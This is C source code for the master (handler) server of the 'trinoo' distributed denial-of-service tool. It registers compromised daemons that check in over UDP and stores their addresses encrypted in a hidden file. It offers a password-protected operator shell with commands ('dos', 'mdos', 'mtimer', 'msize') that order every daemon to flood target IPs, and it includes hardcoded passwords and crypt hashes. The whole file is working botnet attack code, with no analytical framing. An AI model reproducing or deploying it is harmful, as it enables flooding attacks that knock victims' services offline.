#define _XOPEN_SOURCE 1000
#define _BSD_SOURCE

#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <strings.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>

#include "../strfix.h"
#include "../trinoo.h"

/* crypt key encrypted with the key 'bored'(so hex edit cannot get key easily?)
   comment out for no encryption... */
#define CRYPTKEY "ZsoTN.cq4X31"

#ifdef CRYPTKEY
#define VERSION "v1.07d2+f3+c"
#else
#define VERSION "v1.07d2+f3"
#endif

#define PROMPT "trinoo>"

/* FILE holding Bcasts. */
#define OUTFILE "..."

#define Fgets(f,b,s) \
	if (fgets(f, b, s) == NULL) {\
		;\
	}

#define Write(f,b,s) \
	if (write(f, b, s) == 0) {\
		;\
	}

int checkonip(char *);
void sendtolist(int, char *, int);

#ifdef CRYPTKEY
char *encrypt_string(char *, char *);
char *decrypt_string(char *, char *);
#endif

int main(int argc __attribute__ ((unused)), char **argv __attribute__ ((unused)), char **envp __attribute__ ((unused)))
{
	struct sockaddr_in master, from, tcpmast, tcpconn;
	socklen_t fromlen;
	int sock, sock2, numread, bewm = 0, auth = 0, alt;
	int list = 1, foke, hoe, blist, argi, outport = CLIENT_PORT, ttout = 300, idle = 0;
	unsigned int i;
	int pongr = 0;
	FILE *out;
	char buf[BUFSIZ], outbuf[BUFSIZ], comm[15], *arg1;
	char pass[8], *dec, *enc;
	struct in_addr lookip;
	fd_set myfds;
	struct timeval tv;
	struct hostent *he;
	if (argv[1]) {
		if (strcmp(argv[1], "---v") == 0) {
			printf("trinoo %s\n", VERSION);
			exit(0);
		}
	}
	sprintf(pass, "l44adsl");
	if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
		perror("sock");
		exit(-1);
	}
	if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		perror("sock");
		exit(-1);
	}
	printf("?? ");
	Fgets(buf, sizeof(buf), stdin);
	buf[strlen(buf) - 1] = 0;
	if (strcmp((char *)crypt(buf, "0n"), "0nm1VNMXqRMyM") != 0) {
		exit(-1);
	}
	printf("trinoo %s [%s:%s]\n", VERSION, __DATE__, __TIME__);
	bzero((char *)&tcpmast, sizeof(tcpmast));
	tcpmast.sin_family = AF_INET;
	tcpmast.sin_addr.s_addr = INADDR_ANY;
	tcpmast.sin_port = htons(ADMIN_PORT);
	if (bind(sock2, (struct sockaddr *)&tcpmast, sizeof(tcpmast)) == -1) {
		perror("bind");
		exit(-1);
	}
	fcntl(sock2, F_SETFL, O_NONBLOCK);

	listen(sock2, 5);

	master.sin_family = AF_INET;
	master.sin_addr.s_addr = INADDR_ANY;
	master.sin_port = htons(MASTER_PORT);

	if (bind(sock, (struct sockaddr *)&master, sizeof(master)) == -1) {
		perror("bind");
		exit(-1);
	}
	foke = fork();
	if (foke > 0) {
		hoe = setpgid(foke, foke);
		exit(0);
	}
	tv.tv_sec = 1;
	tv.tv_usec = 0;
	while (1) {
		usleep(100);
		FD_ZERO(&myfds);
		FD_SET(sock, &myfds);
		FD_SET(sock2, &myfds);
		if (bewm > 0)
			FD_SET(bewm, &myfds);
		if (select(FD_SETSIZE, &myfds, NULL, NULL, &tv)) {
			if (FD_ISSET(sock, &myfds)) {
				bzero(buf, sizeof(buf));
				fromlen = sizeof(from);
				if ((numread == recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&from, &fromlen)) == -1) {
					perror("read");
					continue;
				}
				if (strcmp("*HELLO*", buf) == 0) {
					if (checkonip((char *)inet_ntoa(from.sin_addr)) > 0) {
						out = fopen(OUTFILE, "a");
						sprintf(outbuf, "%s", (char *)
							inet_ntoa(from.sin_addr));
#ifdef CRYPTKEY
						enc = encrypt_string(decrypt_string("bored", CRYPTKEY), outbuf);
						sprintf(outbuf, "%s", enc);
#endif
						fprintf(out, "%s\n", outbuf);
						fflush(out);
						fclose(out);
						chmod(OUTFILE, 0600);
						if (bewm > 0) {
							sprintf(outbuf, "NEW Bcast - %s\n", inet_ntoa(from.sin_addr));
							Write(bewm, outbuf, strlen(outbuf));
						}
					}
				}
				if (strcmp("PONG", buf) == 0)
					if (bewm > 0) {
						pongr++;
						sprintf(outbuf, "PONG %d Received from %s\n", pongr, inet_ntoa(from.sin_addr));
						Write(bewm, outbuf, strlen(outbuf));
					}
			}
			if (FD_ISSET(sock2, &myfds)) {
				fromlen = sizeof(struct sockaddr);
				if (list > 0) {
					bewm = accept(sock2, (struct sockaddr *)&tcpconn, &fromlen);
					auth = 0;
					list = 0;
					idle = time(NULL);
				} else {
					alt = accept(sock2, (struct sockaddr *)&tcpconn, &fromlen);
					close(alt);
				}
				if (auth == 1) {
					sprintf(outbuf, "Warning: Connection from %s\n", (char *)
						inet_ntoa(tcpconn.sin_addr));
					Write(bewm, outbuf, strlen(outbuf));
				}
			}
			if (FD_ISSET(bewm, &myfds)) {
				bzero(buf, sizeof(buf));
				numread = read(bewm, buf, sizeof(buf));
				if (numread < 1) {
					close(bewm);
					bewm = 0;
					list = 1;
				}
				for (i = 0; i < strlen(buf); i++)
					if (buf[i] == '\n')
						buf[i] = 0;
				for (i = 0; i < strlen(buf); i++)
					if (buf[i] == '\r')
						buf[i] = 0;
				if (!auth) {
					if (strcmp((char *)crypt(buf, "be"), "beUBZbLtK7kkY") == 0) {
						sprintf(outbuf, "trinoo %s..[rpm8d/cb4Sx/]\n\n\n", VERSION);
						Write(bewm, outbuf, strlen(outbuf));
						auth = 1;
					} else {
						close(bewm);
						bewm = 0;
						list = 1;
					}
				}
				if (strcmp(buf, "bcast") == 0) {
					sprintf(outbuf, "Listing Bcasts.\n\n");
					Write(bewm, outbuf, strlen(outbuf));
					out = fopen(OUTFILE, "r");
					if (out == NULL) {
						sprintf(outbuf, "ERROR: Cannot open Bcasts file. Will create a new BLANK one.\n");
						Write(bewm, outbuf, strlen(outbuf));
						out = fopen(OUTFILE, "w");
						if (out == NULL) {
							sprintf(outbuf, "ERROR: Cannot even create a blank Bcasts. Mine as well shutdown the server.\n");
							Write(bewm, outbuf, strlen(outbuf));
						}
					} else {
						blist = 0;
						while (fgets(outbuf, sizeof(buf), out)
						       != NULL) {
							if (outbuf[strlen(outbuf)] == '\n')
								outbuf[strlen(outbuf)-1] = 0;
#ifdef CRYPTKEY
							dec = decrypt_string(decrypt_string("bored", CRYPTKEY), outbuf);
							sprintf(outbuf, "%s\n", dec);
#endif
							if (strlen(outbuf) > 3) {
								blist++;
								Write(bewm, outbuf, strlen(outbuf));
							}
						}
						fclose(out);
						chmod(OUTFILE, 0600);
						sprintf(outbuf, "\nEnd. %d Bcasts total.\n", blist);
						Write(bewm, outbuf, strlen(outbuf));
					}
				}
				if (strcmp(buf, "die") == 0) {
					sprintf(outbuf, "Shutting down.\nNOTICE: Better restart me?\n");
					Write(bewm, outbuf, strlen(outbuf));
					close(bewm);
					close(sock);
					close(sock2);
					sleep(3);
					exit(0);
				}
				if (strcmp(buf, "quit") == 0) {
					sprintf(outbuf, "bye bye.\n");
					Write(bewm, outbuf, strlen(outbuf));
					close(bewm);
					bewm = 0;
					list = 1;
				}
				arg1 = malloc(sizeof(buf));
				bzero(comm, sizeof(comm));
				bzero(arg1, sizeof(arg1));
				sscanf(buf, "%s %s", comm, arg1);
				if (strcmp(comm, "mtimer") == 0) {
					if (strlen(arg1) < 1) {
						sprintf(outbuf, "mtimer: usage: mtimer <seconds to DoS>\n");
						Write(bewm, outbuf, strlen(outbuf));
					} else {
						argi = atoi(arg1);
						if (argi > 2000) {
							argi = 500;
							sprintf(outbuf, "mtimer: You specified amount over 2000, set to 500!\n");
							Write(bewm, outbuf, strlen(outbuf));
						}
						if (argi < 1) {
							argi = 300;
							sprintf(outbuf, "mtimer: You specified amount less than one. Set to 300!\n");
							Write(bewm, outbuf, strlen(outbuf));
						}
						sprintf(outbuf, "mtimer: Setting timer on bcast to %d.\n", argi);
						Write(bewm, outbuf, strlen(outbuf));
						sprintf(outbuf, "bbb %s %d", pass, argi);
						sendtolist(outport, outbuf, strlen(outbuf));
					}
				}
				if (strcmp(comm, "dos") == 0) {
					if (strlen(arg1) < 1) {
						sprintf(outbuf, "DoS: usage: dos <ip>\n");
						Write(bewm, outbuf, strlen(outbuf));
					} else {
						sprintf(outbuf, "DoS: Packeting %s.\n", arg1);
						Write(bewm, outbuf, strlen(outbuf));
						sprintf(outbuf, "aaa %s %s", pass, arg1);
						sendtolist(outport, outbuf, strlen(outbuf));
					}
				}
				if (strcmp(comm, "mdie") == 0) {
					if (strcmp((char *)crypt(arg1, "Er"), "ErDVt6azHrePE") == 0) {
						sprintf(outbuf, "mdie: Disabling Bcasts.\n");
						Write(bewm, outbuf, strlen(outbuf));
						sprintf(outbuf, "d1e %s", pass);
						sendtolist(outport, outbuf, strlen(outbuf));
					} else {
						sprintf(outbuf, "mdie: password?\n");
						Write(bewm, outbuf, strlen(outbuf));
					}
				}
				if (strcmp(comm, "mping") == 0) {
					sprintf(outbuf, "mping: Sending a PING to every Bcasts.\n");
					Write(bewm, outbuf, strlen(outbuf));
					pongr = 0;
					sprintf(outbuf, "png %s", pass);
					sendtolist(outport, outbuf, strlen(outbuf));
				}
				if (strcmp(comm, "mdos") == 0) {
					if (strlen(arg1) < 3) {
						sprintf(outbuf, "MDoS: usage: mdos <ip1:ip2:ip3:>\n");
						Write(bewm, outbuf, strlen(outbuf));
					} else {
						sprintf(outbuf, "MDoS: Packeting %s.\n", arg1);
						Write(bewm, outbuf, strlen(outbuf));
						sprintf(outbuf, "xyz %s 123:%s:", pass, arg1);
						sendtolist(outport, outbuf, strlen(outbuf));
					}
				}
				if (strcmp(comm, "info") == 0) {
					sprintf(outbuf, "This is the \"trinoo\" AKA DoS Project master server. [%s]\nCompiled: %s %s\n", VERSION, __TIME__, __DATE__);
					Write(bewm, outbuf, strlen(outbuf));
				}
				if (strcmp(comm, "msize") == 0) {
					if (atoi(arg1) > 0) {
						sprintf(outbuf, "rsz %d", atoi(arg1));
						sendtolist(outport, outbuf, strlen(outbuf));
					} else {
						sprintf(outbuf, "msize: usage: msize <size>\n");
						Write(bewm, outbuf, strlen(outbuf));
					}
				}
				if (strcmp(comm, "nslookup") == 0) {
					if (strlen(arg1) < 3) {
						sprintf(outbuf, "nslookup: usage: nslookup <host>\n");
						Write(bewm, outbuf, strlen(outbuf));
					} else {
						he = gethostbyname(arg1);
						if (he == NULL) {
							sprintf(outbuf, "nslookup: host not found[%s]\n", arg1);
							Write(bewm, outbuf, strlen(outbuf));
						} else {
							memcpy(&lookip, (he->h_addr), 4);
							sprintf(outbuf, "nslookup: resolved %s to %s\n", arg1, (char *)
								inet_ntoa(lookip));
							Write(bewm, outbuf, strlen(outbuf));
						}
					}
				}
				if (strcmp(comm, "killdead") == 0) {
					sprintf(outbuf, "killdead: Attempting to kill all dead broadcast\n");
					Write(bewm, outbuf, strlen(outbuf));
					sprintf(outbuf, "shi %s", pass);
					sendtolist(outport, outbuf, strlen(outbuf));
					sprintf(outbuf, "%s-b", OUTFILE);
					rename(OUTFILE, outbuf);
					out = fopen(OUTFILE, "a");
					fclose(out);
				}
				if (strcmp(comm, "usebackup") == 0) {
					sprintf(outbuf, "usebackup: Switching to backup data file, If exist.\n");
					Write(bewm, outbuf, strlen(outbuf));
					sprintf(outbuf, "%s-b", OUTFILE);
					if ((out = fopen(outbuf, "r")) != NULL) {
						fclose(out);
						rename(outbuf, OUTFILE);
					}
				}
				if (strcmp(comm, "help") == 0) {
					if (strlen(arg1) < 3) {
						sprintf(outbuf, "Commands: info bcast mping mtimer dos mdos mdie quit nslookup\nDon't know what something is? 'help command'\n");
						Write(bewm, outbuf, strlen(outbuf));
					} else {
						if (strcmp(arg1, "info") == 0) {
							sprintf(outbuf, "help info: Shows version/compile date of server\n");
							Write(bewm, outbuf, strlen(outbuf));
						}
						if (strcmp(arg1, "bcast") == 0) {
							sprintf(outbuf, "help bcast: Lists broadcasts.\n");
							Write(bewm, outbuf, strlen(outbuf));
						}

						if (strcmp(arg1, "mping") == 0) {
							sprintf(outbuf, "help mping: Sends a PING to every Bcasts.\n");
							Write(bewm, outbuf, strlen(outbuf));
						}

						if (strcmp(arg1, "mtimer") == 0) {
							sprintf(outbuf, "help mtimer: Sets amount of seconds the Bcasts will DoS target.\nUsage: mtimer <seconds>\n");
							Write(bewm, outbuf, strlen(outbuf));
						}
						if (strcmp(arg1, "dos") == 0) {
							sprintf(outbuf, "help dos: Packets target.\nUsage: dos <ip>\n");
							Write(bewm, outbuf, strlen(outbuf));
						}
						if (strcmp(arg1, "mdos") == 0) {
							sprintf(outbuf, "help mdos: WARNING *BETA*\nPackets Targets at same time.\nUsage: mdos <target 1:target 2:target 3:>\n");
							Write(bewm, outbuf, strlen(outbuf));
						}
						if (strcmp(arg1, "mdie") == 0) {
							sprintf(outbuf, "help mdie: WARNING DO NOT USE!\nDisables all Bcasts. Makes the daemon die.\n");
							Write(bewm, outbuf, strlen(outbuf));
						}
						if (strcmp(arg1, "quit") == 0) {
							sprintf(outbuf, "help quit: Closes this connection!\n");
							Write(bewm, outbuf, strlen(outbuf));
						}
						if (strcmp(arg1, "nslookup") == 0) {
							sprintf(outbuf, "help nslookup: Resolves hostname to a IP Address.\nUsage: nslookup <host>\n");
							Write(bewm, outbuf, strlen(outbuf));
						}
						if (strcmp(arg1, "mstop") == 0) {
							sprintf(outbuf, "help mstop: Attempts to stop DoS.\n");
							Write(bewm, outbuf, strlen(outbuf));
						}
					}
				}
				if (bewm > 0) {
					sprintf(outbuf, "%s ", PROMPT);
					Write(bewm, outbuf, strlen(outbuf));
				}
				free(arg1);
				idle = time(NULL);
			}
		}
		if (bewm > 0)
			if ((time(NULL) - idle) > ttout) {
				close(bewm);
				bewm = 0;
				list = 1;
			}
	}

	return 0;
}

int checkonip(char *ip)
{
	int blah = 0;
	char buf[BUFSIZ], *dec;
	FILE *out;
	out = fopen(OUTFILE, "r");
	if (out != NULL) {
		while (fgets(buf, sizeof(buf), out) != NULL) {
			if (buf[strlen(buf) - 1] == '\n')
				buf[strlen(buf) - 1] = '\0';
#ifdef CRYPTKEY
			dec = decrypt_string(decrypt_string("bored", CRYPTKEY), buf);
			sprintf(buf, "%s", dec);
#endif
			if (strcmp(ip, buf) == 0)
				blah = 1;
		}
		fclose(out);
	}
	if (blah > 0)
		return -1;
	else
		return 1;
}

void sendtolist(int port, char *outbuf, int len)
{
	struct sockaddr_in out;
	int sock;
	char buf[BUFSIZ], *dec;
	FILE *outread;
	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	out.sin_family = AF_INET;
	out.sin_port = htons(port);

	outread = fopen(OUTFILE, "r");
	if (outread) {
		while (fgets(buf, sizeof(buf), outread) != NULL) {
			if (buf[strlen(buf) - 1] == '\n')
				buf[strlen(buf) - 1] = '\0';
#ifdef CRYPTKEY
			dec = decrypt_string(decrypt_string("bored", CRYPTKEY), buf);
			sprintf(buf, "%s", dec);
#endif
			if (strlen(buf) > 3) {
				out.sin_addr.s_addr = inet_addr(buf);
				sendto(sock, outbuf, len, 0, (struct sockaddr *)&out, sizeof(out));
			}
		}
		fclose(outread);
	}
	close(sock);
}
